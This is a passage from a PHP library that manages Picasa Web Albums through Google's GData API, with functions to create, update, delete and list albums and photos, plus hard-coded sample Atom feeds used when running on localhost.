scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#album'/><title type='text'>X3193</title><summary type='text'/><rights type='text'>public</rights><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5457372612442727137'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5457372612442727137'/><author><name>Yu</name><uri>http://picasaweb.google.com/wanw.x3193.3322.org</uri></author><gphoto:id>5457372612442727137</gphoto:id><gphoto:name>X3193</gphoto:name><gphoto:location/><gphoto:access>public</gphoto:access><gphoto:timestamp>1270623600000</gphoto:timestamp><gphoto:numphotos>0</gphoto:numphotos><gphoto:user>wanw.x3193.3322.org</gphoto:user><gphoto:nickname>Yu</gphoto:nickname><gphoto:commentingEnabled>true</gphoto:commentingEnabled><gphoto:commentCount>0</gphoto:commentCount><media:group><media:content url='http://lh6.ggpht.com/_dm6qv9_mhy8/S7x7egOYIuE/AAAAAAAAACU/hc0BNeb8c7I/X3193.jpg' type='image/jpeg' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'/><media:keywords/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S7x7egOYIuE/AAAAAAAAACU/hc0BNeb8c7I/s160-c/X3193.jpg' height='160' width='160'/><media:title type='plain'>X3193</media:title></media:group></entry><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5459253500704784833</id><published>1970-01-15T17:04:41.000Z</published><updated>2010-04-12T14:11:45.201Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#album'/><title type='text'>TEST</title><summary type='text'>TEST</summary><rights type='text'>public</rights><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5459253500704784833'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/TEST'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5459253500704784833'/><author><name>Yu</name><uri>http://picasaweb.google.com/wanw.x3193.3322.org</uri></author><gphoto:id>5459253500704784833</gphoto:id><gphoto:name>TEST</gphoto:name><gphoto:location>China</gphoto:location><gphoto:access>public</gphoto:access><gphoto:timestamp>1271081000</gphoto:timestamp><gphoto:numphotos>0</gphoto:numphotos><gphoto:user>wanw.x3193.3322.org</gphoto:user><gphoto:nickname>Yu</gphoto:nickname><gphoto:commentingEnabled>true</gphoto:commentingEnabled><gphoto:commentCount>0</gphoto:commentCount><media:group><media:content url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8MqInBRAcE/AAAAAAAAAGk/zb43PQvhyLQ/TEST.jpg' type='image/jpeg' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'>TEST</media:description><media:keywords/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8MqInBRAcE/AAAAAAAAAGk/zb43PQvhyLQ/s160-c/TEST.jpg' height='160' width='160'/><media:title type='plain'>TEST</media:title></media:group><georss:where><gml:Envelope><gml:lowerCorner>18.080862 73.5351877</gml:lowerCorner><gml:upperCorner>53.6424579 134.8556062</gml:upperCorner></gml:Envelope><gml:Point><gml:pos>35.86166 104.195397</gml:pos></gml:Point></georss:where></entry></feed>";
                        }       
                        else{
                                $ch = curl_init();
                                $header[] = "Authorization: GoogleLogin auth=".trim($authclientLogin);
                                $header[] = "GData-Version: 2";
                                //$url = "http://picasaweb.google.com/data/feed/api/user/".arrmember(split('[@]',base64_decode(trim(request("uname")))),0)."?start-index=1&max-results=1000000";
                                $url = "http://picasaweb.google.com/data/feed/api/user/default?start-index=1&max-results=1000000";
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }
                        $postdata = substr($xmlstr,strripos(substr($xmlstr,0,stripos($xmlstr, "5462099787859216289")-0),"<entry>"),strripos(substr($xmlstr,0,stripos($xmlstr, "5462099787859216289")-0),"<entry>")-(stripos($xmlstr,"</entry>",strripos($xmlstr, "5462099787859216289"))+strlen("</entry>")-1));
                        $postdata = preg_replace("/(2007#album'\/><title(?:[ ]+type=[\'|\"]text[\'|\"][ ]*)?>)([^><]*)(<\/title>)/", "$1".trim($albumtitle)."$3", $postdata);
                        $postdata = preg_replace("/(<summary[ ]+type=['|\"]text['|\"][ ]*>)([^><]*)(<\/summary>)/", "$1".trim($albumsummary)."$3", $postdata);
                        $postdata = preg_replace("/(<gphoto:access>)([^><]*)(<\/gphoto:access>)/", "$1".trim($albumaccess)."$3", $postdata);
                        $postdata = preg_replace("/(<gphoto:timestamp>)([^><]*)(<\/gphoto:timestamp>)/", "$1".time()."$3", $postdata);
                        $postdata = preg_replace("/(<gphoto:location>)([^><]*)(<\/gphoto:location>)/", "$1".trim($albumlocation)."$3", $postdata);
                        //$postdata = preg_replace("/(<media:keywords[ ]*/>)/", "<media:keywords>".trim(request("albumkeywords"))."</media:keywords>", $postdata);
                        echo $postdata;
                }
                if (trim($albumid) == ""){
                        $url = "http://picasaweb.google.com/data/feed/api/user/default";
                }       
                elseif (trim($albumid) != ""){
                        $url = "http://picasaweb.google.com/data/entry/api/user/default/albumid/".trim($albumid);
                }
                unset($header);

                $header[] = "Authorization: GoogleLogin auth=".trim($authclientLogin);
                $header[] = "Content-type: application/atom+xml; charset=gb2312";
                $header[] = "Content-length: ".strlen($postdata);
                if (trim($albumid) != ""){
                         $header[] = "If-Match: *"; // 仅供删改使用
                }
                else{
                }
                $header[] = "GData-Version: 2";
                //$header[] = $postdata;
                //echo $url;
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                if (trim($albumid) != ""){
                        curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'PUT');
                        //curl_setopt($ch, CURLOPT_PUT, 1);
                }
                else{
                        curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                        curl_setopt($ch, CURLOPT_POST, 1);                                      
                }
                curl_setopt($ch, CURLOPT_POSTFIELDS, trim($postdata));
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                $xmlstr = curl_exec($ch);
                $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                curl_close($ch);
        }
        $objXml = new DOMDocument();  
        $objXml->preserveWhiteSpace = true;     
        $objXml->async = false; 
        $objXml->loadXML($xmlstr);
        if ($objXml->getElementsByTagName("entry")->item(0)->getElementsByTagName(arrmember(split("[:]","gphoto:id"),"1"))->item(1)->nodeValue != ''){
                $albumcreate['gphotoid'] = $objXml->getElementsByTagName("entry")->item(0)->getElementsByTagName(arrmember(split("[:]","gphoto:id"),"1"))->item(1)->nodeValue;
        }
        $albumcreate['xmlstr'] = $xmlstr;
        $albumcreate['xmlcode'] = $xmlcode;
        return $albumcreate;                    
}

function googlealbumremove($authclientLogin,$albumid,$page,$pagesize,$postfield){
        if (trim($albumid) != ""){
                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                        $xmlstr = "";
                        $xmlcode = "200";
                }       
                else{   
                        $url = "http://picasaweb.google.com/data/entry/api/user/default/albumid/".trim($albumid);               
                        $postdata = "";
                        $header[] = "Authorization: GoogleLogin auth=".trim($authclientLogin);
                        $header[] = "Content-type: application/atom+xml; charset=utf-8";
                        $header[] = "Content-length: ".strlen($postdata);
                        $header[] = "If-Match: *";
                        $header[] = "GData-Version: 2";
                        //$header[] = $postdata;                
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'DELETE');
                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                        $xmlstr = curl_exec($ch);
                        $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                        curl_close($ch);
                }
        }
        elseif (trim($albumid) == ""){
                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
			$xmlstr = "<?php xml version='1.0' encoding='UTF-8'?><feed xmlns='http://www.w3.org/2005/Atom' xmlns:gphoto='http://schemas.google.com/photos/2007' xmlns:media='http://search.yahoo.com/mrss/' xmlns:openSearch='http://a9.com/-/spec/opensearchrss/1.0/' xmlns:gml='http://www.opengis.net/gml' xmlns:georss='http://www.georss.org/georss'><id>http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org</id><updated>2010-04-12T14:11:45.201Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#user'/><title type='text'>wanw.x3193.3322.org</title><subtitle type='text'/><icon>http://lh5.ggpht.com/_dm6qv9_mhy8/AAAA4tc3130/AAAAAAAAAAA/q8cyJASE9Zg/s64-c/wanw.x3193.3322.org.jpg</icon><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org'/><link rel='http://schemas.google.com/photos/2007#slideshow' type='application/x-shockwave-flash' href='http://picasaweb.google.com/s/c/bin/slideshow.swf?host=picasaweb.google.com&amp;RGB=0x000000&amp;feed=http%3A%2F%2Fpicasaweb.google.com%2Fdata%2Ffeed%2Fapi%2Fuser%2Fwanw.x3193.3322.org%3Falt%3Drss'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org?start-index=1&amp;max-results=1000'/><author><name>Yu</name><uri>http://picasaweb.google.com/wanw.x3193.3322.org</uri></author><generator version='1.00' uri='http://picasaweb.google.com/'>Picasaweb</generator><openSearch:totalResults>2</openSearch:totalResults><openSearch:startIndex>1</openSearch:startIndex><openSearch:itemsPerPage>1000</openSearch:itemsPerPage><gphoto:user>wanw.x3193.3322.org</gphoto:user><gphoto:nickname>Yu</gphoto:nickname><gphoto:thumbnail>http://lh5.ggpht.com/_dm6qv9_mhy8/AAAA4tc3130/AAAAAAAAAAA/q8cyJASE9Zg/s64-c/wanw.x3193.3322.org.jpg</gphoto:thumbnail><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5457372612442727137</id><published>2010-04-07T07:00:00.000Z</published><updated>2010-04-07T12:32:58.013Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#album'/><title type='text'>X3193</title><summary type='text'/><rights type='text'>public</rights><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5457372612442727137'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5457372612442727137'/><author><name>Yu</name><uri>http://picasaweb.google.com/wanw.x3193.3322.org</uri></author><gphoto:id>5457372612442727137</gphoto:id><gphoto:name>X3193</gphoto:name><gphoto:location/><gphoto:access>public</gphoto:access><gphoto:timestamp>1270623600000</gphoto:timestamp><gphoto:numphotos>0</gphoto:numphotos><gphoto:user>wanw.x3193.3322.org</gphoto:user><gphoto:nickname>Yu</gphoto:nickname><gphoto:commentingEnabled>true</gphoto:commentingEnabled><gphoto:commentCount>0</gphoto:commentCount><media:group><media:content url='http://lh6.ggpht.com/_dm6qv9_mhy8/S7x7egOYIuE/AAAAAAAAACU/hc0BNeb8c7I/X3193.jpg' type='image/jpeg' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'/><media:keywords/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S7x7egOYIuE/AAAAAAAAACU/hc0BNeb8c7I/s160-c/X3193.jpg' height='160' width='160'/><media:title type='plain'>X3193</media:title></media:group></entry><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5459253500704784833</id><published>1970-01-15T17:04:41.000Z</published><updated>2010-04-12T14:11:45.201Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#album'/><title type='text'>TEST</title><summary type='text'>TEST</summary><rights type='text'>public</rights><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5459253500704784833'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/TEST'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5459253500704784833'/><author><name>Yu</name><uri>http://picasaweb.google.com/wanw.x3193.3322.org</uri></author><gphoto:id>5459253500704784833</gphoto:id><gphoto:name>TEST</gphoto:name><gphoto:location>China</gphoto:location><gphoto:access>public</gphoto:access><gphoto:timestamp>1271081000</gphoto:timestamp><gphoto:numphotos>0</gphoto:numphotos><gphoto:user>wanw.x3193.3322.org</gphoto:user><gphoto:nickname>Yu</gphoto:nickname><gphoto:commentingEnabled>true</gphoto:commentingEnabled><gphoto:commentCount>0</gphoto:commentCount><media:group><media:content url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8MqInBRAcE/AAAAAAAAAGk/zb43PQvhyLQ/TEST.jpg' type='image/jpeg' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'>TEST</media:description><media:keywords/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8MqInBRAcE/AAAAAAAAAGk/zb43PQvhyLQ/s160-c/TEST.jpg' height='160' width='160'/><media:title type='plain'>TEST</media:title></media:group><georss:where><gml:Envelope><gml:lowerCorner>18.080862 73.5351877</gml:lowerCorner><gml:upperCorner>53.6424579 134.8556062</gml:upperCorner></gml:Envelope><gml:Point><gml:pos>35.86166 104.195397</gml:pos></gml:Point></georss:where></entry></feed>";
                }       
                else{
                        $ch = curl_init();
                        $header[] = "Authorization: GoogleLogin auth=".trim($authclientLogin);
                        $header[] = "GData-Version: 2";                         
                        $url = "http://picasaweb.google.com/data/feed/api/user/default?start-index=1&max-results=1000000";
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                          
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                        $xmlstr = curl_exec($ch);
                        curl_close($ch);
                        unset($header);
                }   
                $objXml = new DOMDocument();  
                $objXml->preserveWhiteSpace = true;
                $objXml->async = false; 
                $objXml->loadXML($xmlstr);
                //echo $xmlstr;
                //return;
                $objList = $objXml->getElementsByTagName("entry");                      

                if ($objList->length > floor($pagesize)) 
                        $strpagesize = $pagesize; 
                else 
                        $strpagesize = $objList->length;
                $totalitem = $objList->length;
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                if ($totalpage == $page)
                        $endid = $totalitem-1;
                elseif ($totalpage > $page)
                        $endid = floor($strpagesize*($page)-1);
                elseif ($totalpage < $page){
                        $endid = floor($strpagesize*($page-1)-1);
                }       
                $xmlstr = "wait";                       
                for($i = $strpagesize*($page-1);$i <= $endid;$i++){
                        $objHdd = $objList->item($i);
                        if ($postfield["chidd".$i] != ""){
                                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                        $xmlstr = "";
                                        $xmlcode = "200";
                                }       
                                else{   
                                        //$url = iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","gphoto:id"),"1"))->item(0)->nodeValue)."/".$versionID;     
                                        //$url = iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","gphoto:id"),"1"))->item(0)->nodeValue);    
                                        $url = "http://picasaweb.google.com/data/entry/api/user/default/albumid/".iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","gphoto:id"),"1"))->item(1)->nodeValue);
                                        $postdata = "";
                                        $header[] = "Authorization: GoogleLogin auth=".trim($authclientLogin);
                                        $header[] = "Content-type: application/atom+xml; charset=utf-8";
                                        $header[] = "Content-length: ".strlen($postdata);
                                        $header[] = "If-Match: *";
                                        $header[] = "GData-Version: 2";
                                        $header[] = $postdata;          
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                        curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'DELETE');
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                                        curl_setopt($ch, CURLOPT_POST, 1);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                        $xmlstr = curl_exec($ch);
                                        $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);                                
                                        curl_close($ch);
                                }
                        }
                        if ($xmlstr != "" && $xmlstr <> "wait"){
                                unset($header);                 
                                break;
                        }       
                        else{
                                unset($header);
                        }                                       
                }               
        }
        $albumremove['xmlstr'] = $xmlstr;
        $albumremove['xmlcode'] = $xmlcode;
        return $albumremove;
}

function googlephotolist($authdata,$albumid,$page,$pagesize){
        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
			$xmlstr = "<?php xml version='1.0' encoding='UTF-8'?><feed xmlns='http://www.w3.org/2005/Atom' xmlns:exif='http://schemas.google.com/photos/exif/2007' xmlns:gphoto='http://schemas.google.com/photos/2007' xmlns:media='http://search.yahoo.com/mrss/' xmlns:openSearch='http://a9.com/-/spec/opensearchrss/1.0/' xmlns:gml='http://www.opengis.net/gml' xmlns:georss='http://www.georss.org/georss'><id>http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273</id><updated>2010-04-20T06:28:40.039Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#album'/><title type='text'>X3193</title><subtitle type='text'>X3193</subtitle><rights type='text'>public</rights><icon>http://lh6.ggpht.com/_dm6qv9_mhy8/S8lf9KEtgmE/AAAAAAAAAPI/zLOuk3gVFWE/s160-c/X3193.jpg</icon><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193'/><link rel='http://schemas.google.com/photos/2007#slideshow' type='application/x-shockwave-flash' href='http://picasaweb.google.com/s/c/bin/slideshow.swf?host=picasaweb.google.com&amp;RGB=0x000000&amp;feed=http%3A%2F%2Fpicasaweb.google.com%2Fdata%2Ffeed%2Fapi%2Fuser%2Fwanw.x3193.3322.org%2Falbumid%2F5461001527444210273%3Falt%3Drss'/><link rel='http://schemas.google.com/photos/2007#report' type='text/html' href='http://picasaweb.google.com/lh/reportAbuse?uname=wanw.x3193.3322.org&amp;aid=5461001527444210273'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273?start-index=1&amp;max-results=1000'/><author><name>Yu</name><uri>http://picasaweb.google.com/wanw.x3193.3322.org</uri></author><generator version='1.00' uri='http://picasaweb.google.com/'>Picasaweb</generator><openSearch:totalResults>5</openSearch:totalResults><openSearch:startIndex>1</openSearch:startIndex><openSearch:itemsPerPage>1000</openSearch:itemsPerPage><gphoto:id>5461001527444210273</gphoto:id><gphoto:name>X3193</gphoto:name><gphoto:location>China</gphoto:location><gphoto:access>public</gphoto:access><gphoto:timestamp>1271488000</gphoto:timestamp><gphoto:numphotos>5</gphoto:numphotos><gphoto:user>wanw.x3193.3322.org</gphoto:user><gphoto:nickname>Yu</gphoto:nickname><gphoto:commentingEnabled>true</gphoto:commentingEnabled><gphoto:commentCount>0</gphoto:commentCount><georss:where><gml:Envelope><gml:lowerCorner>18.080862 73.5351877</gml:lowerCorner><gml:upperCorner>53.6424579 134.8556062</gml:upperCorner></gml:Envelope><gml:Point><gml:pos>35.86166 104.195397</gml:pos></gml:Point></georss:where><gphoto:allowPrints>true</gphoto:allowPrints><gphoto:allowDownloads>true</gphoto:allowDownloads><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461356353765299666</id><published>2010-04-18T06:11:55.000Z</published><updated>2010-04-18T06:11:55.647Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#photo'/><title type='text'>200732415592131379.jpg</title><summary type='text'/><content type='image/jpeg' src='http://lh6.ggpht.com/_dm6qv9_mhy8/S8qiqxIA1dI/AAAAAAAAAOQ/b9F-dC0PHio/200732415592131379.jpg'/><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461356353765299666'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193#5461356353765299666'/><link rel='http://schemas.google.com/photos/2007#canonical' type='text/html' href='http://picasaweb.google.com/lh/photo/ET6IGxZSMgyyQO6EtqgqEA'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461356353765299666'/><link rel='http://schemas.google.com/photos/2007#report' type='text/html' href='http://picasaweb.google.com/lh/reportAbuse?uname=wanw.x3193.3322.org&amp;aid=5461001527444210273&amp;iid=5461356353765299666'/><gphoto:id>5461356353765299666</gphoto:id><gphoto:version>1</gphoto:version><gphoto:position>2.0</gphoto:position><gphoto:albumid>5461001527444210273</gphoto:albumid><gphoto:access>public</gphoto:access><gphoto:width>2560</gphoto:width><gphoto:height>1920</gphoto:height><gphoto:size>1079514</gphoto:size><gphoto:client/><gphoto:checksum/><gphoto:timestamp>1271571115000</gphoto:timestamp><gphoto:imageVersion>228</gphoto:imageVersion><gphoto:commentCount>0</gphoto:commentCount><gphoto:license id='0' name='All Rights Reserved' url=''>ALL_RIGHTS_RESERVED</gphoto:license><exif:tags><exif:fstop>5.6</exif:fstop><exif:make>OLYMPUS OPTICAL CO.,LTD</exif:make><exif:model>X-2,C-50Z       </exif:model><exif:exposure>0.004</exif:exposure><exif:flash>false</exif:flash><exif:focallength>18.83</exif:focallength><exif:iso>80</exif:iso><exif:imageUniqueID>91eae41caefa1b8168ff654be922b499</exif:imageUniqueID></exif:tags><media:group><media:content url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8qiqxIA1dI/AAAAAAAAAOQ/b9F-dC0PHio/200732415592131379.jpg' height='1200' width='1600' type='image/jpeg' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'/><media:keywords/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8qiqxIA1dI/AAAAAAAAAOQ/b9F-dC0PHio/s72/200732415592131379.jpg' height='54' width='72'/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8qiqxIA1dI/AAAAAAAAAOQ/b9F-dC0PHio/s144/200732415592131379.jpg' height='108' width='144'/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8qiqxIA1dI/AAAAAAAAAOQ/b9F-dC0PHio/s288/200732415592131379.jpg' height='216' width='288'/><media:title type='plain'>200732415592131379.jpg</media:title></media:group></entry><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461368367913393618</id><published>2010-04-18T06:58:32.000Z</published><updated>2010-04-18T06:58:32.472Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#photo'/><title type='text'>200732415592131379.jpg</title><summary type='text'/><content type='image/jpeg' src='http://lh3.ggpht.com/_dm6qv9_mhy8/S8qtmFUIXdI/AAAAAAAAAOY/vLow0hwBqII/200732415592131379.jpg'/><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461368367913393618'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193#5461368367913393618'/><link rel='http://schemas.google.com/photos/2007#canonical' type='text/html' href='http://picasaweb.google.com/lh/photo/Md_xYvcNP3mcPLiMrfbL7w'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461368367913393618'/><link rel='http://schemas.google.com/photos/2007#report' type='text/html' href='http://picasaweb.google.com/lh/reportAbuse?uname=wanw.x3193.3322.org&amp;aid=5461001527444210273&amp;iid=5461368367913393618'/><gphoto:id>5461368367913393618</gphoto:id><gphoto:version>1</gphoto:version><gphoto:position>3.0</gphoto:position><gphoto:albumid>5461001527444210273</gphoto:albumid><gphoto:access>public</gphoto:access><gphoto:width>2560</gphoto:width><gphoto:height>1920</gphoto:height><gphoto:size>1079514</gphoto:size><gphoto:client/><gphoto:checksum/><gphoto:timestamp>1271573912000</gphoto:timestamp><gphoto:imageVersion>230</gphoto:imageVersion><gphoto:commentCount>0</gphoto:commentCount><gphoto:license id='0' name='All Rights Reserved' url=''>ALL_RIGHTS_RESERVED</gphoto:license><exif:tags><exif:fstop>5.6</exif:fstop><exif:make>OLYMPUS OPTICAL CO.,LTD</exif:make><exif:model>X-2,C-50Z       </exif:model><exif:exposure>0.004</exif:exposure><exif:flash>false</exif:flash><exif:focallength>18.83</exif:focallength><exif:iso>80</exif:iso><exif:imageUniqueID>91eae41caefa1b8168ff654be922b499</exif:imageUniqueID></exif:tags><media:group><media:content url='http://lh3.ggpht.com/_dm6qv9_mhy8/S8qtmFUIXdI/AAAAAAAAAOY/vLow0hwBqII/200732415592131379.jpg' height='1200' width='1600' type='image/jpeg' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'/><media:keywords/><media:thumbnail url='http://lh3.ggpht.com/_dm6qv9_mhy8/S8qtmFUIXdI/AAAAAAAAAOY/vLow0hwBqII/s72/200732415592131379.jpg' height='54' width='72'/><media:thumbnail url='http://lh3.ggpht.com/_dm6qv9_mhy8/S8qtmFUIXdI/AAAAAAAAAOY/vLow0hwBqII/s144/200732415592131379.jpg' height='108' width='144'/><media:thumbnail url='http://lh3.ggpht.com/_dm6qv9_mhy8/S8qtmFUIXdI/AAAAAAAAAOY/vLow0hwBqII/s288/200732415592131379.jpg' height='216' width='288'/><media:title type='plain'>200732415592131379.jpg</media:title></media:group></entry><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461377717417411186</id><published>2010-04-18T07:34:49.000Z</published><updated>2010-04-18T07:34:49.375Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#photo'/><title type='text'>logo_cn.gif</title><summary type='text'/><content type='image/gif' src='http://lh6.ggpht.com/_dm6qv9_mhy8/S8q2GS7mAnI/AAAAAAAAAOg/22_vMSiH0No/logo_cn.gif'/><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461377717417411186'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193#5461377717417411186'/><link rel='http://schemas.google.com/photos/2007#canonical' type='text/html' href='http://picasaweb.google.com/lh/photo/rIiepHjPBzA7v7rfPriS2w'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461377717417411186'/><link rel='http://schemas.google.com/photos/2007#report' type='text/html' href='http://picasaweb.google.com/lh/reportAbuse?uname=wanw.x3193.3322.org&amp;aid=5461001527444210273&amp;iid=5461377717417411186'/><gphoto:id>5461377717417411186</gphoto:id><gphoto:version>1</gphoto:version><gphoto:position>4.0</gphoto:position><gphoto:albumid>5461001527444210273</gphoto:albumid><gphoto:access>public</gphoto:access><gphoto:width>276</gphoto:width><gphoto:height>110</gphoto:height><gphoto:size>7763</gphoto:size><gphoto:client/><gphoto:checksum/><gphoto:timestamp>1271576089000</gphoto:timestamp><gphoto:imageVersion>232</gphoto:imageVersion><gphoto:commentCount>0</gphoto:commentCount><gphoto:license id='0' name='All Rights Reserved' url=''>ALL_RIGHTS_RESERVED</gphoto:license><exif:tags><exif:imageUniqueID>e633ed9c7f5a9250b4de235457d8778a</exif:imageUniqueID></exif:tags><media:group><media:content 